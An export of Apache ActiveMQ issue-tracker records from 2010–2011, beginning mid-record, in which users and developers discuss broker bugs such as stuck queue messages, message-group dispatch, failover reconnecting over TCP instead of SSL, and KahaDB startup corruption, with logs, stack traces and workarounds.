2010-10-01 15:55:51 Queue [DEBUG] TEST_QUEUE toPageIn: 2, Inflight: 353, pagedInMessages.size 353, enqueueSize: 10395
2010-10-01 15:55:51 Usage [DEBUG] Main:memory:queue://TEST_QUEUE:memory: usage change from: 70% of available memory, to: 69% of available memory
2010-10-01 15:55:51 Usage [DEBUG] Main:memory:queue://TEST_QUEUE:memory: usage change from: 69% of available memory, to: 70% of available memory
{noformat}

At the end of the log file, where we have a single message stuck on the queue, we see:

{noformat}
2010-10-01 15:56:10 Queue [DEBUG] TEST_QUEUE toPageIn: 1, Inflight: 0, pagedInMessages.size 0, enqueueSize: 100000
2010-10-01 15:56:10 Queue [DEBUG] TEST_QUEUE toPageIn: 1, Inflight: 0, pagedInMessages.size 0, enqueueSize: 100000
2010-10-01 15:56:10 Queue [DEBUG] TEST_QUEUE toPageIn: 1, Inflight: 0, pagedInMessages.size 0, enqueueSize: 100000
2010-10-01 15:56:10 Queue [DEBUG] TEST_QUEUE toPageIn: 1, Inflight: 0, pagedInMessages.size 0, enqueueSize: 100000
2010-10-01 15:56:10 Queue [DEBUG] TEST_QUEUE toPageIn: 1, Inflight: 0, pagedInMessages.size 0, enqueueSize: 100000
2010-10-01 15:56:10 Queue [DEBUG] TEST_QUEUE toPageIn: 1, Inflight: 0, pagedInMessages.size 0, enqueueSize: 100000
{noformat}

We can see the checkpoint failing to clean up the log files:

{noformat}
2010-10-01 15:56:36 MessageDatabase [DEBUG] Checkpoint started.
2010-10-01 15:56:36 MessageDatabase [DEBUG] not removing data file: 2 as contained ack(s) refer to referenced file: [1, 2]
2010-10-01 15:56:36 MessageDatabase [DEBUG] not removing data file: 3 as contained ack(s) refer to referenced file: [2, 3]
2010-10-01 15:56:36 MessageDatabase [DEBUG] not removing data file: 4 as contained ack(s) refer to referenced file: [3, 4]
2010-10-01 15:56:36 MessageDatabase [DEBUG] not removing data file: 5 as contained ack(s) refer to referenced file: [4, 5]
2010-10-01 15:56:36 MessageDatabase [DEBUG] Checkpoint done.
{noformat}

At this point our consumer had consumed all of the messages except the single stuck message.

We are using a clean out of the box set up - we have made no changes to the default activemq.xml file,

",Red Hat Enterprise Linux 5,fgynnild,janstey,pblackburn,straun,tranchida,vadimos,watcher,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"12/Oct/10 12:50;pblackburn;TrackedMessageDequeuer.java;https://issues.apache.org/jira/secure/attachment/12461810/TrackedMessageDequeuer.java","12/Oct/10 12:50;pblackburn;TrackedMessageEnqueuer.java;https://issues.apache.org/jira/secure/attachment/12461809/TrackedMessageEnqueuer.java","13/Oct/10 12:58;pblackburn;activemq.xml;https://issues.apache.org/jira/secure/attachment/12461837/activemq.xml",,,,,,,,,,,,,,,,,,,3.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,14832,,,Tue Apr 19 12:49:08 UTC 2011,,,,,,,,,,,"0|i0akcv:",59571,,,,,,,,,,,,,,,,,,,,,"11/Oct/10 17:07;pblackburn;With a different test harness, we can get this failure to occur at the same point every time (for 1K message size always happens at  the 286th message sent, for 10K message size  at the 45th message sent nd for 100K message size at the 5th message sent).

Further investigation shows that when this occurs, the following conditions hold:

In class {{Queue}}, method {{doPageIn}}, the following loop body does not get executed as {{messages.hasNext()}} is returning false:

{code}
while (messages.hasNext() && count < toPageIn) {
    MessageReference node = messages.next();
    messages.remove();
// snipped for brevity
{code}

At this point, {{count=0}}, {{toPageIn=1}} and {{messages.size()=1}}.

Following the code through to the {{BTreeNode}} class, we find that the leaf node contains a single key with value 44.  When the {{BTreeNode.BTreeIterator}} class is instantiated, it is being passed in a value of 535 for the value of the default cursor position as the {{batchResetNeeded}} flag is false. This causes the loop body in the {{findNextPage}} method to exit before it sets the {{nextEntry}} field, leaving it null.

If we stick a quick hack into the {{doPageIn}} method in class {{Queue}} then the problem seems to go away, but we still don't know what the underlying cause was and we are wary of changing code that we don't fully understand:

{code}
if (messages.size() > 0 && !messages.hasNext()) {
    store.resetBatching();
}

while (messages.hasNext() && count < toPageIn) {
    MessageReference node = messages.next();
    messages.remove();
// snipped for brevity
{code}



;;;","12/Oct/10 10:41;gtully;My suspicion is the operation of the setBatch method, disabling the cache will help pinpoint (policy entry useCache=false).

One thing that looks odd is in org.apache.activemq.store.kahadb.KahaDBStore.KahaDBMessageStore#resetBatching,
that does not obtain the indexLock, it should be comparable to org.apache.activemq.store.kahadb.KahaDBStore.KahaDBMessageStore#setBatch in this regard. It looks like this could be related to your problem, if an batch rest was missed from contention.

btw: What is the difference between your test case above and the other test harness?;;;","12/Oct/10 12:50;pblackburn;Attached test harness. 

Compile with following:

{noformat}
javac -cp .activemq-core-5.4.1.jar:geronimo-j2ee-management_1.1_spec-1.0.1.jar:log4j-1.2.15.jar:commons-logging.jar:jms.jar *.java
{noformat}

When producing the error, we restart the activemq server and wait until we see the MessageDatabase ""Checkpoint done"" message in the log, then kick off the enquer as follows:

{noformat}
java -cp .:jms.jar:activemq-core-5.4.1.jar:geronimo-j2ee-management_1.1_spec-1.0.1.jar:log4j-1.2.15.jar:commons-logging.jar jms.TrackedMessageEnqueuer 'tcp://localhost:61616' 1 10 0
{noformat}

and then immediately kick off the dequeuer as follows:

{noformat}
java -cp .:jms.jar:lib/activemq-core-5.4.1.jar:geronimo-j2ee-management_1.1_spec-1.0.1.jar:log4j-1.2.15.jar:commons-logging.jar jms.TrackedMessageDequeuer 'tcp://localhost:61616'
{noformat}

We don't always get the error, but when it occurs it is always on the 45th message sent, using the 10K message size as shown.;;;","12/Oct/10 15:18;pblackburn;Thanks for that Gary, I added some additional debug - the method {{KahaDBStore.KahaDMMessageStore#resetBatching}} is called once as the broker starts up and is not called again during my test run (I removed my hack from the {{Queue}} class).

I then tried the following three variations of this method:
# Added call to {{indexLock.readLock().lock()}}
# Added call to {{lockAsyncJobQueue}} and {{indexLock.readLock().lock()}}
# Added call to {{indexLock.writeLock().lock()}}

The stuck message is still observed with each variation.

I'll keep digging.;;;","13/Oct/10 09:41;pblackburn;As suggested, I tried adding {{useCache=""false""}} to the queues' {{policyEntry}} element in {{activemq.xml}}. After doing this I have been unable to reproduce the issue.;;;","13/Oct/10 12:07;gtully;that is good, in that it points to org.apache.activemq.store.kahadb.KahaDBStore.KahaDBMessageStore#setBatch and the cursor and store being out of sync. The intention is that when the cache is full and eventually exhausted, reading from the store can commence from the point in the store that corresponds to the last entry in the cache. 
can you attach your activemq.xml?;;;","13/Oct/10 12:58;pblackburn;Attached {{activemq.xml}} file used.;;;","19/Apr/11 12:49;dejanb;I cannot reproduce this problem in 5.5.0 version (while it is easily reproduced in 5.4.1 and 5.4.2). There was some work in this area for 5.5.0 release, so it seems that this has been fixed as well.

Can you please retest and reopen the issue if you still experience problems.;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Message groups with small prefetch,AMQ-2952,12483838,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Major,Fixed,dejanb,dejanb,dejanb,30/Sep/10 14:55,29/Oct/10 18:30,14/Jul/23 05:43,30/Sep/10 15:10,5.4.1,,,,,5.4.2,,,Broker,,,,0,,,,,,,,,Closing and starting message groups with a lot of consumers and a small prefetch could result in messages being dispatched to wrong consumers. The problem is that message group logic is done before we detecting weather the consumer is full or not. ,,rjanney,zgl,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,14830,,,Fri Oct 29 18:29:09 UTC 2010,,,,,,,,,,,"0|i0ba0f:",63734,,,,,,,,,,,,,,,,,,,,,"30/Sep/10 15:10;dejanb;Fixed with svn commit 1003096, by doing message group operations only if consumer is not full;;;","29/Oct/10 18:29;rjanney;We ran into this issue with one of our 5.4.1 AMQ instances in production.  We found that once all consumers are full, the remaining messages are all assigned to a single consumer.  When we reproduced this issue in test & stepped through the Queue class in AMQ, we found that this happens because the group logic is done before the full detection.

For example, we had 15 consumers with a prefetch size of 1 and a backlog of 1000 messages.  Each consumer had at least 1 message assigned to it & some had a few more than that (possibly finished processing the first message before all consumers were full).  Once all 15 consumers were full, the remaining 980 or so messages were assigned to the same consumer :(  This lead to a significant performance problem where we had all the work waiting on a single thread and the other 14 threads idle doing nothing.

We were able to work around this problem by setting the pre-fetch to 100 for our 15 consumers.   This allowed the messages to be dispatched in a  round-robin fashion for the first 1500 messages in the queue.

The fix above to only do group operations on non-full consumers should also resolve the effect we observed.;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
XA transactions not rolled back when on connection close,AMQ-2950,12483841,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Major,Fixed,dejanb,dejanb,dejanb,29/Sep/10 13:09,29/Sep/10 13:11,14/Jul/23 05:43,29/Sep/10 13:11,5.4.1,,,,,5.4.2,,,Broker,,,,0,,,,,,,,,We should roll them back the same way we do for local transactions,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,14736,,,Wed Sep 29 13:11:43 UTC 2010,,,,,,,,,,,"0|i0b9vr:",63713,,,,,,,,,,,,,,,,,,,,,"29/Sep/10 13:11;dejanb;fixed with svn revision 1002604;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Support ajax clients in multiple windows/tabs in a single browser,AMQ-2948,12483846,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Major,Fixed,dejanb,alexdean,alexdean,28/Sep/10 17:21,22/Jul/12 04:43,14/Jul/23 05:43,13/Oct/10 11:54,5.4.1,,,,,5.4.2,,,,,,,0,,,,,,,,,"In current ajax code, there is a 1-1 relationship between ajax client and session.  Since multiple windows in the same browser share the same session, it's impossible for the ajax code to update both windows.  Either 1 or the other will receive messages, but not both.

The attached patch allows an optional 'clientId' string to be passed to the JavaScript amq.init() function, similar to that supported by the REST servlet.  This clientId string is sent to the server with every ajax request.  In MessageListenerServlet, a new consumer is created for every new sessionid+clientId, allowing multiple windows in the same browser to send & receive messages independently.

For some (currently) unknown reason, IE7 cannot send messages from multiple windows.  2 IE7 windows can receive messages independently with no errors, but once either IE7 window sends a message, both windows cease receiving data.  This behavior is not seen in FF (OSX or WinXP) or Safari (OSX).  All those browsers are able to send & receive simultaneously in multiple windows with no errors.","OSX 10.6
Centos 5.4",saravanantp,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"30/Sep/10 21:11;alexdean;support-multiple-ajax-clients-per-session.patch;https://issues.apache.org/jira/secure/attachment/12461876/support-multiple-ajax-clients-per-session.patch",,,,,,,,,,,,,,,,,,,,,1.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,14838,,,Sun Jul 22 04:43:35 UTC 2012,,,,,,,Patch Available,,,,"0|i0b9xj:",63721,,,,,,,,,,,,,,,,,,,,,"28/Sep/10 17:29;alexdean;There's a separate minor change in the attached patch, which ensures that the Content-Type header is always set to 'text/xml'.

In current svn code, this header is only set when a message is delivered.  When a timeout occurs (and an empty <ajax-response></ajax-response> is returned), the Content-Type header is set to 'text/plain'.  The jQuery adapter attempts to parse the responseXML property of the response, which is not populated due to the Content-Type header being set to 'text/plain'.

This is seen in FIrebug as a 200 response resulting in a parseerror.  (Successful response which fired the error-handling ajax callback!);;;","28/Sep/10 22:20;alexdean;We have observed that ActiveMQ running with this patch does not clean up session data as quickly as we expected.  (Every reload of a browser window which uses the clientId parameter creates 5 new threads in the JVM, and these do not appear to be cleaned up.)  We're going to investigate this a bit more and possibly submit a revised patch.;;;","30/Sep/10 21:11;alexdean;This patch replaces the original one I attached to this ticket.

Changes since original patch:
 - private MessageListenerServlet.ClientConsumerState class refactored to AjaxWebClient (extends WebClient).
 - private MessageListenerServlet.Listener class refactored to AjaxListener.  AjaxWebClient uses an instance of Listener/AjaxListener, so this needs to be public.
 - AjaxWebClient & associated data for each client are now stored in a MessageListenerServlet instance variable (ajaxWebClients) rather than in sessions.
 - Timer/TimerTask code added to examine ajaxWebClients and clean up clients which have not been accessed in the past minute.  This solves the thread-leakage we were seeing in my initial patch.
 - JavaScript to append clientId parameter to all requests moved to amq.js, so no changes are required to the jquery, prototype, or dojo adapters.

New patch also includes a new JS test, and an updated chat.html which uses a clientId (so you can open chat.html in multiple windows in the same browser) for a quick test.;;;","13/Oct/10 11:54;dejanb;Committed with svn revision 1022071. Thanks a lot for a great work.

I think there's two things left to be done to complete Ajax improvements:

* Documentation on Ajax is way out of date, so we should update it with these new features - http://activemq.apache.org/ajax.html
* We should automate JS tests and include them in our unit testing suite with something like WebDriver (http://code.google.com/p/selenium/wiki/GettingStarted);;;","22/Jul/12 04:38;saravanantp;Hi,
I have a auction application being developed and have multiple users login at the same time for bidding. I understand that clientId in amq.init is the unique parameter that distincts each users window. Say for example, user U1 is logged in IE and user U2 is logged in Chrome at the same time. When they bid, the messages and updated price information are passing to both the users. However, when U1 logs out of the application and logs in back for bidding, he doesnt see the updated price information in his screen, which is weird. Can you please let me know if this is really an issue or I am doing something wrong, please? I use ActiveMQ 5.6.0 with Java and Spring Framework. Appreciate your response.

Saravanan Thoppan;;;","22/Jul/12 04:43;saravanantp;Slight change in my words - However, when U1 logs out of the application and logs in back for bidding and when he starts bidding, the update doesnt come to his winidow but the other users U2 sees the price information being updated on his.

Saravanan Thoppan;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Failover transport always re-connects to the first configured transport instead of the original transport speficied in the connection url,AMQ-2944,12483836,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Major,Fixed,,rarciere,rarciere,24/Sep/10 15:35,25/Feb/11 18:49,14/Jul/23 05:43,25/Feb/11 18:49,5.3.1,,,,,5.5.0,,,,,,,0,,,,,,,,,"I am using a single broker configured to accept both tcp and ssl connections using the configuration below

<transportConnectors>
       <transportConnector name=""openwire"" uri=""tcp://0.0.0.0:61616""/>
       <transportConnector name=""ssl"" uri=""ssl://0.0.0.0:61617""/>
</transportConnectors>

The clients are configured to use the failover transport over ssl to connect to a single broker (e.g. URL: failover:ssl://Host:61616).  Upon startup the client correctly connects to the broker on port 61617 via ssl.  I then simulate a network outage and the transport is interrupted and waits for the connection to become available.  After a short amount of time the Broker detects inactivity on the connection and then drops the connection (viewed via JMX and Jconsole).  When the network connection is restored, the client reconnects to broker on port 61616 using tcp instead of ssl on port 61617 (not good if you require ssl encryption).

It appears that the ordering of the transportConnectors in the activemq.xml file affects which transport is used upon resumption of an interrupted failover transport.  It turns out that upon reconnection the first defined transport will always be used regardless of what transport was specified in the original client connection url.  Changing the ordering to the following fixes the problem and upon reconnection the ssl transport will be used.  However, the reverse issue will occur for clients that originally connection via tcp transport where upon reconnection they will connect via ssl transport instead of tcp.

<transportConnectors>
       <transportConnector name=""ssl"" uri=""ssl://0.0.0.0:61617""/>
       <transportConnector name=""openwire"" uri=""tcp://0.0.0.0:61616""/>
</transportConnectors>",,bsnyder,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"27/Sep/10 18:56;rarciere;activemq.xml;https://issues.apache.org/jira/secure/attachment/12461874/activemq.xml",,,,,,,,,,,,,,,,,,,,,1.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,46511,,,Fri Feb 25 18:49:05 UTC 2011,,,,,,,,,,,"0|i0akd3:",59572,,,,,,,,,,,,,,,,,,,,,"27/Sep/10 17:56;tabish;Have you tried with the v5.4.1 release of ActiveMQ, there were some changes in the FailoverTransport that might have resolved your issue.;;;","27/Sep/10 18:34;rarciere;I tested with version 5.4.1 and the issue is still present.  Other versions that I tested with and which exhibit the issue are 5.3.1, 5.4.0 & 5.4.1.;;;","27/Sep/10 18:50;tabish;Can you attach you full broker config.  (activemq.xml);;;","27/Sep/10 18:56;rarciere;My Activemq.xml configuration file;;;","27/Sep/10 21:25;tabish;The code is working as designed, the first transport in the config file is reported to the client upon connection and that value updates the FailoverTransport.  ;;;","04/Oct/10 14:38;rarciere;If the design is to use the first transport in the configuration file (which probably should be documented), then that poses a problem in environments where you require clients to connect via tcp or ssl exclusively (based on each clients connection requirements).  My main concern is that clients that require ssl encryption always connect via ssl because of the security implications.  My workaround has been to put the ssl connection first in the config file which I can live with, but that forces other clients on local network or vpn to reconnect when transport is interrupted via ssl instead of tcp which still works, but is less then optimum.

Wouldn't it make more sense to have clients only reconnect on transports specified in the configured failover transport URI's on the current connection, or am I missing something?;;;","25/Feb/11 18:49;tabish;This should be resolved with the changes for updating the cluster client's and not using the broker infos to populate the uri's for the failover transport.  

;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Can't configure an inactivity monitor for https transport,AMQ-2942,12483823,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Major,Fixed,,slewis,slewis,23/Sep/10 19:34,23/Sep/10 20:47,14/Jul/23 05:43,23/Sep/10 20:47,5.4.1,,,,,5.4.2,,,Transport,,,,0,,,,,,,,,"Well, you can however the configuration isn't applied.  This patch sorts that out.  Note that I couldn't automate a test for this as I had to manually kill off one of the brokers to get the behavior to manifest itself, as described [here|http://fusesource.com/issues/browse/MB-733].",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"23/Sep/10 19:35;slewis;AMQ-2942.txt;https://issues.apache.org/jira/secure/attachment/12461860/AMQ-2942.txt",,,,,,,,,,,,,,,,,,,,,1.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,14811,,,Thu Sep 23 20:47:48 UTC 2010,,,,,,,Patch Available,,,,"0|i0ba1j:",63739,,,,,,,,,,,,,,,,,,,,,"23/Sep/10 20:47;tabish;Patch applied in trunk.  Thanks;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
ActiveMQ Console requires Jasypt bundle which is not part of the ActiveMQ features,AMQ-2938,12483949,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Major,Fixed,dejanb,jb@nanthrax.net,jb@nanthrax.net,23/Sep/10 15:55,24/Sep/10 14:51,14/Jul/23 05:43,24/Sep/10 14:51,5.4.1,,,,,5.4.2,,,Broker,,,,0,,,,,,,,,"ActiveMQ Console OSGi bundle now requires org.jasypt.encryption.pbe package (defined in import package statement).

Unfortunately the ActiveMQ feature doesn't provide the jasypt bundle.

So, when you install and start ActiveMQ feature, you get:

java.lang.Exception: Could not start bundle mvn:org.apache.activemq/activemq-console/5.4.1 in feature(s) : Unresolved constraint in bundle org.apache.activemq.activemq-console [44]: Unable to resolve 44.0: missing requirement [44.0] package; (
package=org.jasypt.encryption.pbe) - [44.0] package; (package=org.jasypt.encryption.pbe)

I'm gonna submit a patch to provide a clean ActiveMQ feature.",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"24/Sep/10 07:07;jb@nanthrax.net;AMQ-2938-5.4.1-tag.patch;https://issues.apache.org/jira/secure/attachment/12461909/AMQ-2938-5.4.1-tag.patch","24/Sep/10 06:49;jb@nanthrax.net;AMQ-2938-trunk.patch;https://issues.apache.org/jira/secure/attachment/12461908/AMQ-2938-trunk.patch",,,,,,,,,,,,,,,,,,,,2.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,14834,,,Fri Sep 24 14:51:05 UTC 2010,,,,,,,,,,,"0|i0ba0v:",63736,,,,,,,,,,,,,,,,,,,,,"24/Sep/10 06:49;jb@nanthrax.net;Patch on trunk.;;;","24/Sep/10 07:07;jb@nanthrax.net;Patch based on the 5.4.1 tag.;;;","24/Sep/10 14:51;dejanb;Fixed on trunk with svn revision 1000891;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
java.io.EOFException: Chunk stream does not exist at page on broker start,AMQ-2935,12483866,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Blocker,Fixed,gtully,andyg,andyg,23/Sep/10 12:43,09/Oct/15 02:49,14/Jul/23 05:43,06/Oct/10 13:43,5.4.0,5.4.1,5.4.2,,,5.4.2,,,Broker,,,,17,,,,,,,,,"I am seeing this regularly upon restarts in all versions from 5.4.x - I cannot downgrade due to breaking issues in previous versions.
The broker was shutdown cleanly with no logged issues.
Deleting the activemq-data directory seems to be the only recovery solution (which is not an option in production)

2010-09-23 13:54:30,997 [Starting ActiveMQ Broker] ERROR org.apache.activemq.broker.BrokerService - Failed to start ActiveMQ JMS Message Broker. Reason: java.io.EOFException: Chunk stream does not exist at page: 0
java.io.EOFException: Chunk stream does not exist at page: 0
	at org.apache.kahadb.page.Transaction$2.readPage(Transaction.java:454)
	at org.apache.kahadb.page.Transaction$2.<init>(Transaction.java:431)
	at org.apache.kahadb.page.Transaction.openInputStream(Transaction.java:428)
	at org.apache.kahadb.page.Transaction.load(Transaction.java:404)
	at org.apache.kahadb.page.Transaction.load(Transaction.java:361)
	at org.apache.activemq.broker.scheduler.JobSchedulerStore$3.execute(JobSchedulerStore.java:250)
	at org.apache.kahadb.page.Transaction.execute(Transaction.java:728)
	at org.apache.activemq.broker.scheduler.JobSchedulerStore.doStart(JobSchedulerStore.java:239)
	at org.apache.activemq.util.ServiceSupport.start(ServiceSupport.java:53)
	at org.apache.activemq.broker.scheduler.SchedulerBroker.getStore(SchedulerBroker.java:198)
	at org.apache.activemq.broker.scheduler.SchedulerBroker.getInternalScheduler(SchedulerBroker.java:185)
	at org.apache.activemq.broker.scheduler.SchedulerBroker.start(SchedulerBroker.java:85)
	at org.apache.activemq.broker.BrokerFilter.start(BrokerFilter.java:157)
	at org.apache.activemq.broker.BrokerFilter.start(BrokerFilter.java:157)
	at org.apache.activemq.broker.TransactionBroker.start(TransactionBroker.java:112)
	at org.apache.activemq.broker.BrokerService$3.start(BrokerService.java:1786)
	at org.apache.activemq.broker.BrokerService.start(BrokerService.java:496)
	at org.apache.activemq.ra.ActiveMQResourceAdapter$1.run(ActiveMQResourceAdapter.java:85)","Win7 32bit, JDK 1.6_20",adamaitch,akhanzode,alexdean,alisenberg,austinmills,computerpunk,dioh,eric-awl,fenghao0038,fgynnild,hanson2010,hc,jjordan,kbrown@intralinks.com,maxim.valyanskiy,ngehring,nikolay.elenkov,norman,okozlov,redvortex,rjanney,rjtokenlanring,s1ngle,shiweiyuan,sslavic,straun,swapnonil,tomdz,tpurcell@chariotsolutions.com,volkerk,ywtsang,,,,,,,,,,,,,,AMQ-3648,,,,,,,,,,,,,,,,,,,,,,,,,,"23/Sep/10 13:35;andyg;activemq-data.zip;https://issues.apache.org/jira/secure/attachment/12461872/activemq-data.zip","23/Sep/10 12:58;andyg;activemq.xml;https://issues.apache.org/jira/secure/attachment/12461859/activemq.xml","24/Sep/10 17:42;bryanck;stacktraces.txt;https://issues.apache.org/jira/secure/attachment/12461845/stacktraces.txt",,,,,,,,,,,,,,,,,,,3.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,14825,,,Fri Oct 09 02:49:19 UTC 2015,,,,,,,,,,,"0|i0ba07:",63733,,,,,,,,,,,,,,,,,,,,,"23/Sep/10 12:46;andyg;Here is my config and zipped activemq-data directory;;;","23/Sep/10 15:49;eric-awl;
I upgraded from 5.3.2 to 5.4.1. Some jars (spring) were updated.

If  I delete all files in activemq-data/xxxx/scheduler and then restart the process. It's OK

[sibModule@td0sib01s SIBBusModule-TestDeCharge-td0sib01s]$ ll scheduler
total 36
-rw-r--r-- 1 sibModule sibdev     0 Sep 23 17:39 db-1.log
-rw-r--r-- 1 sibModule sibdev     0 Sep 23 17:39 lock
-rw-r--r-- 1 sibModule sibdev 16384 Sep 23 17:39 scheduleDB.data
-rw-r--r-- 1 sibModule sibdev 16408 Sep 23 17:39 scheduleDB.redo

If I stop the process with a CTRL-C shutdown action and try to restart it without deleting the files, I have this error.

[sibModule@td0sib01s scheduler]$ ll
total 36
-rw-r--r-- 1 sibModule sibdev     0 Sep 23 17:39 db-1.log
-rw-r--r-- 1 sibModule sibdev 16384 Sep 23 17:44 scheduleDB.data
-rw-r--r-- 1 sibModule sibdev 16408 Sep 23 17:39 scheduleDB.redo

I have a MemoryPersistance configuration.


;;;","23/Sep/10 16:05;eric-awl;When I add
schedulerSupport=""false""

in the ""broker"" configuration, It seems OK. No activemq-data directory nor files below are created.

Example :

<broker xmlns=""http://activemq.apache.org/schema/core"" brokerName=""SIBBusModule-TestDeCharge-td0sib01s"" useJmx=""true"" persistent=""false"" useShutdownHook=""false"" schedulerSupport=""false"">


;;;","24/Sep/10 09:23;andyg;Thanks Eric,

Applying the property schedulerSupport=""false""  to the broker seems to have nipped this in the bud, at least for the few tests I have run.

Where did you find the docs on this parameter? - All I can find is this: http://activemq.apache.org/delay-and-schedule-message-delivery.html

As this was introduced recently (5.4.x) as new option I think 'false' should really be the default option - Especially as it seems to be broken.;;;","24/Sep/10 17:27;bryanck;Setting the schedulerSupport=false for me did reduce the likelihood of this error occurring for me. With it set to true, it happens nearly every single time I shut down and restart. However, I am still getting the problem intermittently after shutdown and restart, even with this set to false, albeit less frequently. I will attached stack traces of it occurring with both schedulerSupport=true and false (the error occurs in different places during initialization).

Also, to note, this is a much more frequent occurrence with 5.4.1 vs 5.4.0. I do not have this issue with 5.3.2 so have downgraded to that for now.

This occurs for me on both Windows 7 64-bit JDK 1.6.21 and Mac OS 10.6.4.
;;;","24/Sep/10 17:42;bryanck;Stack traces of the issue, with schedulerSupport=true and with schedulerSupport=false;;;","26/Sep/10 07:14;shiweiyuan;I get the same issue when try activemq 5.4.1 on linux with jdk1.5. and I get around this issue by deleting all files/folders under data.
But it will not be practical if it's a production environment.;;;","26/Sep/10 09:49;andyg;Yes Bryan, you are right, setting schedulerSupport=false has only 'reduced' the likelihood of this occurring - This is still happening, but less frequently.

There must be a race condition on shutdown which is corrupting the KahaDB files - I have looked at the startup code, but nothing seems to have changed much recently.

The corruption is obviously more aggressive in the the sheduler code.

This is a real show stopper for me right now, so I will dig more into this to see if I can find the problem.;;;","26/Sep/10 09:58;andyg;I have elevated this to 'Blocker' due to the fact that others are also experiencing this, and that the general solution for everyone is to physically delete files in order to continue - not an option in production.
